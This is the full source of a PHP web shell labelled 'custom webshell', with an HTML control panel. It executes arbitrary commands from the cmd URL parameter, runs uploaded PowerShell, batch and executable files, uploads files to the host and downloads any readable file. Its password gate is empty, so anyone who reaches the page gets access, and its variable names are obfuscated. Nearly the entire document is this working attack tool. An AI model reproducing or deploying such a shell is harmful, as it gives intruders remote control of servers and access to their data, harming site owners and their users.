<!-- 
#̷𝓍   𝓐𝓡𝓢 𝓢𝓒𝓡𝓘𝓟𝓣𝓤𝓜 
#̷𝓍   custom webshell
-->


<?php         $t0=''; 
        global $k1;
        global $k2;
    if($t0 != null) {
        if (isset($_COOKIE['pass'])) {                         if (hash('sha512', $_COOKIE['pass']) !== $t0) {
                echo "Wrong password !";
                exit;
            }
        } else {
            echo "Wrong password !";
            exit;
        }
    }

    function getAbsolute(string $k3): string
    {
                $k3 = mb_ereg_replace('\\\\|/', '/', $k3, 'msr');
                $y4 = $k3[0] === '/';
                preg_match('/^[a-z]:/', $k3, $a5);
        $j6 = isset($a5[0]) ? $a5[0] : false;
                $o7 = array_filter(explode('/', $k3), 'mb_strlen');

        $j8 = [];
        foreach ($o7 as $t9) {
            if ('.' === $t9) {
                continue;
            }
                                                            if ('..' === $t9
                && !$y4
                && !$j6
                && empty(array_filter($j8, function ($o10) { return !('..' === $o10); }))
            ) {
                $j8[] = $t9;
                continue;
            }
            if ('..' === $t9) {
                array_pop($j8);
                continue;
            }
            $j8[] = $t9;
        }

        return
            (($y4 ? '/' : $j6) ?
                $j6.'/' : ''
            ).implode('/', $j8);
    }

        if (isset($_POST['upload'])) {
        $j11 = getDir();
        $m12 = $j11.'/'.basename($_FILES['file']['name']);

        if (file_exists($m12)) {
            echo "<script>alert('Error: File already exists !')</script>";
        }
        else if (move_uploaded_file($_FILES['file']['tmp_name'], $m12)) {
            echo "<script>alert('File uploaded successfuly !')</script>";
        } else {
            echo "<script>alert('Error: Could not upload file !')</script>";
        }
    
    }
    else if (isset($_GET['runscript'])) {
        $q13 = $_GET['runscript'];
        $n14 = getAbsolute($q13);
        $z15 = 'pwsh -Noni -Nop -File "' . $n14 . '"';
        global $k1;
        global $k2;
        $k1 = shell_exec($z15);
    }
    else if (isset($_GET['runexe'])) {
        $q13 = $_GET['runexe'];
        $n14 = getAbsolute($q13);
        $z15 = $n14;
        exec('cd '.realpath(getDir()).' && '.$n14, $k1, $k2);
    }
    else if (isset($_GET['runbat'])) {
        $q13 = $_GET['runbat'];
        $n14 = getAbsolute($q13);
        $z15 = 'pwsh -Noni -Nop -Command { Start-Process "cmd.exe" -ArgumentList @("/k","' . $n14 . ') }';
        exec('cd '.realpath(getDir()).' && '.$n14, $k1, $k2);
    }
    
        if (isset($_GET['download'])) {
        $w16 = $_GET['download'];
        if (file_exists($w16)) {
            if (is_readable($w16)) {
                header('Content-Description: File Transfer');
                header('Content-Type: application/octet-stream');
                header('Content-Disposition: attachment; filename="'.basename($w16).'"');
                header('Expires: 0');
                header('Cache-Control: must-revalidate');
                header('Pragma: public');
                header('Content-Length: '.filesize($w16));
                readfile($w16);
                exit;
            } else {
                echo "<script>alert('Error: Could not read the file !')</script>";
                exit;
            }
        }
    }

    function getHeaderColor(){
        return 'rgb(32, 0, 128)';
    }
    function getPrimaryColor(){
        return '#00ff00';
    }
    function getSecondaryColor(){
        return '#d92626';
    }
    function getCommandColor(){
        return '#ff0066';
    }
    function getCommandOutputColor(){
        return '#3ADF00';
    }
    function getExplorerColor(){
        return '#3ADF00';
    }
    function getDirectoryColor(){
        return '#3ADF00';
    }
    function getNavTextColor(){
        return '#ff5500';
    }
    function getHeaderTextColor(){
        return '#C0C0C0';
    }
    function getNavTextHoverColor(){
        return '#C0C0C0';
    }
    function getButtonsColor(){
        return '#3ADF00';
    }
    function getBgColor($u17){
        switch ($u17) {
          case 1:
            return '#101010';
            break;
          case 2:
            return '#202020';
            break;
          case 3:
            return '#303030';
            break;
          case 4:
            return '#404040';
            break;
          default:
            return '#404040';
        }
        return '#404040';
    }
    function fileExtension($d18) {
        $q19 = strrpos($d18, '.');
        return ($q19 === false) ? '' : substr($d18, $q19+1);
    }
    function getItemSize($l20) {
        $k2 =  '';
        $t21 = getDir().'/'.$l20;
        if (is_dir($t21)){  
            $k2 .=  '<td style="color: "' .  getDirectoryColor() . '">';
            $k2 .= htmlspecialchars('<dir>');
        }
        else{
            $k2 .=  '<td style="color: "' .  getSecondaryColor() . '">';
            $f22 = formatSizeUnits(filesize($t21));
            $k2 .= $f22;
        }
        $k2 .= '</td>';
        return $k2;
    }
    function getItemActions($l20) {
        $k2 =  '';
        $f23 = pathinfo($l20, PATHINFO_EXTENSION);
        switch ($f23) {
          case "ps1":
            $k2 .=  '<td style="color: "' .  getSecondaryColor() . '">';
            $k2 .= makeRunScriptFile($l20);
            break;
          case "bat":
            $k2 .=  '<td style="color: "' .  getSecondaryColor() . '">';
            $k2 .= makeRunBatFile($l20);
            break;
          case "exe":
            $k2 .=  '<td style="color: "' .  getSecondaryColor() . '">';
            $k2 .= makeRunExeFile($l20);
            break;
          default:
            $k2 .=  '<td style="color: "' .  getSecondaryColor() . '">';
            $k2 .= htmlspecialchars('noop');
        }
        $k2 .= '</td>';
        return $k2;
    }
    function printPerms($w16) {
        $o24 = fileperms($w16);
        if( $o24 & 0x1000 ) { $a25='p'; }
        else if( $o24 & 0x2000 ) { $a25='c'; }
        else if( $o24 & 0x4000 ) { $a25='d'; }
        else if( $o24 & 0x6000 ) { $a25='b'; }
        else if( $o24 & 0x8000 ) { $a25='-'; }
        else if( $o24 & 0xA000 ) { $a25='l'; }
        else if( $o24 & 0xC000 ) { $a25='s'; }
        else $a25='u';
        $y26["read"] = ($o24 & 00400) ? 'r' : '-';
        $y26["write"] = ($o24 & 00200) ? 'w' : '-';
        $y26["execute"] = ($o24 & 00100) ? 'x' : '-';
        $v27["read"] = ($o24 & 00040) ? 'r' : '-';
        $v27["write"] = ($o24 & 00020) ? 'w' : '-';
        $v27["execute"] = ($o24 & 00010) ? 'x' : '-';
        $t28["read"] = ($o24 & 00004) ? 'r' : '-';
        $t28["write"] = ($o24 & 00002) ? 'w' : '-';
        $t28["execute"] = ($o24 & 00001) ? 'x' : '-';
        if( $o24 & 0x800 ) $y26["execute"] = ($y26['execute']=='x') ? 's' : 'S';
        if( $o24 & 0x400 ) $v27["execute"] = ($v27['execute']=='x') ? 's' : 'S';
        if( $o24 & 0x200 ) $t28["execute"] = ($t28['execute']=='x') ? 't' : 'T';
        $o29=sprintf("%1s", $a25);
        $o29.=sprintf("%1s%1s%1s", $y26['read'], $y26['write'], $y26['execute']);
        $o29.=sprintf("%1s%1s%1s", $v27['read'], $v27['write'], $v27['execute']);
        $o29.=sprintf("%1s%1s%1s", $t28['read'], $t28['write'], $t28['execute']);
        return $o29;
    }

    function formatSizeUnits($t30) {
        if ($t30 >= 1073741824)
        {
            $t30 = number_format($t30 / 1073741824, 2) . ' GB';
        }
        elseif ($t30 >= 1048576)
        {
            $t30 = number_format($t30 / 1048576, 2) . ' MB';
        }
        elseif ($t30 >= 1024)
        {
            $t30 = number_format($t30 / 1024, 2) . ' KB';
        }
        elseif ($t30 > 1)
        {
            $t30 = $t30 . ' bytes';
        }
        elseif ($t30 == 1)
        {
            $t30 = $t30 . ' byte';
        }
        else
        {
            $t30 = '0 bytes';
        }

        return $t30;
    }


    function getDir() {
        return isset($_GET['dir']) ? realpath($_GET['dir']) : getcwd();
    }


    function makeFileName($w16) {
        if (is_dir(getDir().'/'.$w16)) {
            return '<a href="'.$_SERVER['PHP_SELF'].'?dir='.realpath(getDir().'/'.$w16).'">'.$w16.'</a>';
        } else {
            return '<a href="'.$_SERVER['PHP_SELF'].'?download='.realpath(getDir().'/'.$w16).'">'.$w16.'</a>';
        }
    }
    function makeRunScriptFile($w16) {
        return '<a href="'.$_SERVER['PHP_SELF'].'?runscript='.getAbsolute(getDir().'/'.$w16).'&dir='.realpath(getDir()) . '">'.'run</a>';
    }
    function makeRunExeFile($w16) {
        return '<a href="'.$_SERVER['PHP_SELF'].'?runexe='.getAbsolute(getDir().'/'.$w16).'&dir='.realpath(getDir()) . '">'.'run</a>';
    }
    function makeRunBatFile($w16) {
        return '<a href="'.$_SERVER['PHP_SELF'].'?runbat='.getAbsolute(getDir().'/'.$w16).'&dir='.realpath(getDir()) . '">'.'run</a>';
    }
    function getFiles() {
        $f31 = scandir(getDir());

        $z32 = true;
        if ($f31 != null) {
            foreach($f31 as $l20){
                                echo '<tr style="background-color:'.($z32  ? '#515151' : '#212121').';">';
                echo '<td style="font-weight:thin;">'.makeFileName($l20).'</td>'; 
                                                echo ''.getItemSize($l20).'';
                echo ''.getItemActions($l20).'';
                echo '</tr>';
                $z32 = !$z32;
            }
        } else {
            echo "<p>Couldn't open that directory !";
        }
    }

    function getCmdResults() {
        global $k1;
        global $k2;
        
        if ($k2 == 0 ) {
            if($k1 != null){
                foreach ($k1 as $z33) {

                    if($z33 != null){
                        echo "<br>";
                        echo htmlspecialchars($z33);
                        echo "\n";
                        
                    }
                }
            }
        } else {
            echo "Execution failed with error code: ".$k2;
        }    
    }

    function getCommandLine() {
        $j34 = gethostname() ?? 'none';
        $g35 = get_current_user();
        $t36 = getDir();
        $p37 = isset($_GET['cmd']) ? $_GET['cmd'] : '';

        return '<span style="color: #ff6347">'.$g35.'@'.$j34.'</span>: <span style="color: #B40404">'.$t36.'</span>$ '.$p37;
    }

    if (isset($_GET['cmd'])) {
        exec('cd '.realpath(getDir()).' && '.$_GET['cmd'], $k1, $k2);
    }
?>

<!DOCTYPE html>
<html>
    <head>
        <meta charset="utf-8">
        <title>My WebShell</title>
        
        <script>
            function changeDir() {
                const url = '<?php echo $_SERVER['PHP_SELF'].'?dir='?>';
                const path = window.prompt("Enter the path you want to naviguate to (Eg: '/home/user'): ");

                if (path) window.location = (url + path);
            }
        </script>
        <style>
            :root {
                --header-color: <?php echo getHeaderColor();?>;
                --background-color-1: <?php echo getBgColor(1);?>;
                --background-color-2: <?php echo getBgColor(2);?>;
                --background-color-3: <?php echo getBgColor(3);?>;
                --background-color-4: <?php echo getBgColor(4);?>;
                --primary-color: <?php echo getPrimaryColor();?>;
                --secondary-color: <?php echo getSecondaryColor();?>;
                --command-color: <?php echo getCommandColor();?>;
                --commandoutput-color: <?php echo getCommandOutputColor();?>;
                --explorer-color: <?php echo getExplorerColor();?>;
                --directory-color: <?php echo getDirectoryColor();?>;
                --navtext-color: <?php echo getNavTextColor();?>;
                --navtext-hover-color: <?php echo getNavTextHoverColor();?>;
                --header-text-color: <?php echo getHeaderTextColor();?>;
                --buttons-color: <?php echo getButtonsColor();?>;
            }
        </style>
        <script>
            const popupHtmlUploadFile = `
                <div class="popup-container" id="upload-popup">
                    <div class="popup">
                        <h4>Choose a file to upload</h4>
                        <form action="<?php echo $_SERVER['PHP_SELF'].'?dir='.getDir()?>" method="POST" enctype="multipart/form-data">
                            <input type="file" name='file' id='file' required>
                            <div class="popup-buttons">
                                <button type="button" onclick="hidePopup()">Cancel</button>
                                <input type="submit" value="Upload" name="upload">
                            </div>
                        </form>
                    </div>
                </div>
            `;
            const popupHtmlRunPowerShellScript = `
                <div class="popup-container" id="upload-popup">
                    <div class="popup">
                        <h4>Choose a script to run...</h4>
                        <form action="<?php echo $_SERVER['PHP_SELF'].'?dir='.getDir()?>" method="POST" enctype="multipart/form-data">
                            <input type="file" name='file' id='file' required>
                            <div class="popup-buttons">
                                <button type="button" onclick="hidePopup()">Cancel</button>
                                <input type="submit" value="runpwsh" name="runpwsh">
                            </div>
                        </form>
                    </div>
                </div>
            `;
            function showUploadPopup() {
                const body = document.getElementsByTagName('body')[0];
                const bodyHTML = body.innerHTML;

                body.innerHTML = popupHtmlUploadFile + bodyHTML;
            }
            function showRunScriptPopup() {
                const body = document.getElementsByTagName('body')[0];
                const bodyHTML = body.innerHTML;

                body.innerHTML = popupHtmlRunPowerShellScript + bodyHTML;
            }
            function hidePopup() {
                const body = document.getElementsByTagName('body')[0];
                body.removeChild(body.getElementsByClassName('popup-container')[0]); 
            }
        </script>
    </head>
    <body class="body-container">   
        <header>
            <nav>
                <h1>> control panel</h1>
                <div class="nav-items">
                    <a onclick="showUploadPopup()">[upload]</a>
                    <a onclick="changeDir()">[cd]</a>
                </div>
            </nav>
        </header>
        <div class="content-container">
            <div class="explorer-panel">
                <h4>Exploring: <?php echo getDir()?></h4>
                <table>
                    <tr style="background-color:var(--header-color);">
                        <th>Folder / <span style="font-weight: lighter;">File</span></th>
                        <!--<th>Owner</th>
                        //<th>Permissions</th> -->
                        <th>Size</th>
                        <th>Actions</th>
                    </tr>
                    <?php getFiles()?>
                </table>
            </div>
            <div class="command-panel">
                <div class="command-output">
                    <p><?php echo getCommandLine()?></p>
                    <p><?php getCmdResults()?></p>
                </div>
                <form id="command-input" action="<?php echo $_SERVER['PHP_SELF']?>" method="get">
                    <input type="text" name="cmd">
                    <input type="hidden" name="dir" value="<?php echo getDir()?>"/>
                    <button action="submit">
                        <p>Send</p>
                    </button>
                </form>
            </div>
        </div>
        <style>



            html, body {
                width: 100%;
                height: 100%;
                margin: 0;
                padding: 0;
                background-color: var(--background-color-2);
                
            }

            .body-container {
                display: grid;
                grid-template-rows: 50px calc(100% - 50px);
            }

            header {
                z-index:1;
                background-color: var(--header-color);
                box-shadow: 0px 2px 6px black;
            }

            header nav {
                height: 100%;
                display: flex;
                justify-content: flex-start;     
                color: var(--header-text-color);
                font-family: 'Consolas', monospace;
            }

            header h1 {
                height: 100%;
                margin: 0;
                margin-left: 20px;
                text-align: center;
                line-height: 50px;
                font-size: 24px;
            }

            header .nav-items {
                height: 100%;
                width: auto;
                margin: 0;
                display: flex;
                flex-grow: 1;
                justify-content: flex-end;
            }

            header .nav-items a {
                height: 100%;
                margin-right: 30px;
                color: var(--navtext-color);
                font-size: 12px;
                text-decoration: none;
                line-height: 50px;
                text-align:center;
                transition: ease-in 0.2s;     
            }

            header .nav-items a:hover {
                color:  var(--navtext-hover-color);
                cursor: pointer;
            }

            .content-container {
                height: 100%;
                position: relative;
                display: grid;
                grid-template-columns: 30% 70%;      
                color:  rgb(0, 128, 255);
                font-family: 'Consolas', monospace;
            }

            .explorer-panel {
                background-color: var(--background-color-3);
                color: var(--explorer-color);
                font-family: 'Consolas', monospace;
                overflow-y: scroll;
                scrollbar-color: var(--background-color-4) var(--background-color-3);
                scrollbar-width: thin;
                box-shadow: 0px 0px 4px black;
                padding: 3px;
            }

            .explorer-panel h4 {
                margin: 10px;
                font-size: 12px;
                color: var(--explorer-color);
            }

            .explorer-panel table {font-size
                width: 100%;
                word-wrap: break-word;
                border-spacing: 2px;
                table-layout: auto;
                color: hsl(30, 100%, 50%);
                background-color: var(--background-color-2);
                font-size: 12px;
            }

            .explorer-panel table td {
                padding: 1px 2px;
            }

            .explorer-panel table a {
                color: var(--primary-color);
                text-decoration: none;         
            }

            .explorer-panel table a:hover {
                color: var(--secondary-color);
                transition: ease 0.2s;
                font-size: 12px;
            }

            .command-panel {    
                margin: 20px;
                padding: 15px;
                border-radius: 5px;
                color: var(--command-color);
                background-color: var(--background-color-3);
                display: grid;
                grid-template-rows: 93% calc(7% - 15px);
                row-gap: 15px;
                box-shadow: 0px 0px 6px black;
                font-size: 8px;
            }

            .command-output {
                padding: 5px;
                border-radius: 5px;
                background-color: var(--background-color-1);              
                overflow-y: scroll;
                scrollbar-color: var(--background-color-4) var(--background-color-3);
                scrollbar-width: thin;
                font-family: 'Consolas', monospace;
                color: var(--commandoutput-color);
            }

            .command-output p {
                margin: 0px;
                font-family: 'Consolas', monospace;
            }

            #command-input {
                display: grid;
                grid-template-columns: 89% 10%;
                grid-template-rows: 100%;
                column-gap: 1%;
            }

            #command-input input{
                height: 100%;
                width: 100%;
                border-radius: 5px;
                border: none;
                background-color: var(--background-color-2);        
                color: var(--command-color);
                font-size: 12px;
            }

            #command-input button{
                height: 100%;
                width: 100%;
                border: none;
                border-radius: 5px;
                background-color: var(--background-color-4);  
                cursor: pointer;
            }

            #command-input button:hover{
                background-color: var(--primary-color);
                transition: ease-in-out 0.3s;
            }

            #command-input button p{
                margin:0;
                color: var(--buttons-color);
                font-family: 'Consolas', monospace;
                font-size: 12px;
                font-weight: bolder;
                line-height: 100%;
            }


            .popup-container {
                z-index: 5;
                position: fixed;
                background-color: rgba(10,10,10, 0.6);
                width: 100%;
                height: 100%;
                display: grid;
                justify-content: center;
                align-content: center;
                grid-template-columns: 30%;
                grid-template-rows: 35%;
            }

            .popup {
                background-color: var(--background-color-3);
                border-radius: 5px;
                box-shadow: 0px 2px 6px black;
                display: grid;
                grid-template-rows: 20% 70%;
                row-gap: 10%;
                padding: 2.5%;
            }

            .popup h4{
                text-align: center;
                font-family: 'Consolas', monospace;
                font-size: 12px;
            }

            .popup form {
                display: grid;
                grid-template-rows: 80% 20%;
                grid-template-columns: 95%;
                justify-content: center;
                align-content: center;
            }

            .popup-buttons {
                height: 100%;
                display: inline-flex;
                flex-wrap: wrap;
                gap: 10%;
            }

            .popup-buttons button {
                width: 45%;
                background-color: var(--background-color-4);
                border-radius: 4px;;
                border: none;
                font-size: 22px;
                color: var(--buttons-color);
                transition: ease-in 0.2s;
            }

            .popup-buttons button:hover {
                background-color: var(--background-color-2);
                cursor: pointer;            
            }

            .popup-buttons input {
                width: 45%;
                background-color: var(--primary-color);
                border-radius: 4px;;
                border: none;
                font-size: 22px;
                color: var(--buttons-color);
                transition: ease-in 0.2s;
            }

            .popup-buttons input:hover {
                background-color: var(--secondary-color);
                cursor: pointer; 
            }
        </style>
    </body>
</html>



